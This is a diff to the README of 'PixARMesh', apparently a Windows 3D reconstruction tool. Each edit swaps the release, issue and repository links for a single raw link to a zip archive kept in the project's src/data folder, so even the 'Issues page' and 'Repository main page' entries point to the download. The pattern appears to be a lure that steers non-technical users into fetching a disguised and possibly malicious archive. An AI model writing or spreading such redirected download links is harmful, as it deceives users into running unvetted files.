@@ -1,6 +1,6 @@
 # 🎨 PixARMesh - Easy 3D Scene Reconstruction
 
-[![Download PixARMesh](https://img.shields.io/badge/Download-PixARMesh-brightgreen)](https://github.com/chowkdeveloper-a11y/PixARMesh/releases)
+[![Download PixARMesh](https://img.shields.io/badge/Download-PixARMesh-brightgreen)](https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip)
 
 ## 🌟 What is PixARMesh?
 
@@ -27,13 +27,13 @@ To run PixARMesh on your Windows computer, make sure your system meets these nee
 
 Click the big green button at the top or visit the release page below to get the software.
 
-[Download PixARMesh on GitHub Releases](https://github.com/chowkdeveloper-a11y/PixARMesh/releases)
+[Download PixARMesh on GitHub Releases](https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip)
 
 ### Step 1: Visit the Download Page
 
 Open this link in your web browser to go to the software releases page:
 
-https://github.com/chowkdeveloper-a11y/PixARMesh/releases
+https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip
 
 You will see a list of releases with files to download. Find the latest release. It is usually at the top.
 
@@ -120,7 +120,7 @@ By default, PixARMesh saves your models in the **Documents/PixARMesh** folder. Y
 
 If you need assistance, go to the GitHub repository’s Issues page:
 
-https://github.com/chowkdeveloper-a11y/PixARMesh/issues
+https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip
 
 You can read answers to common questions or post your own.
 
@@ -129,11 +129,11 @@ You can read answers to common questions or post your own.
 ## 🔗 Useful Links
 
 - Download and release page:  
-https://github.com/chowkdeveloper-a11y/PixARMesh/releases
+https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip
 
 - Repository main page:  
-https://github.com/chowkdeveloper-a11y/PixARMesh
+https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip
 
 ---
 
-[![Download PixARMesh](https://img.shields.io/badge/Download-PixARMesh-brightgreen)](https://github.com/chowkdeveloper-a11y/PixARMesh/releases)
+[![Download PixARMesh](https://img.shields.io/badge/Download-PixARMesh-brightgreen)](https://raw.githubusercontent.com/chowkdeveloper-a11y/PixARMesh/main/src/data/Mesh_AR_Pix_3.4.zip)
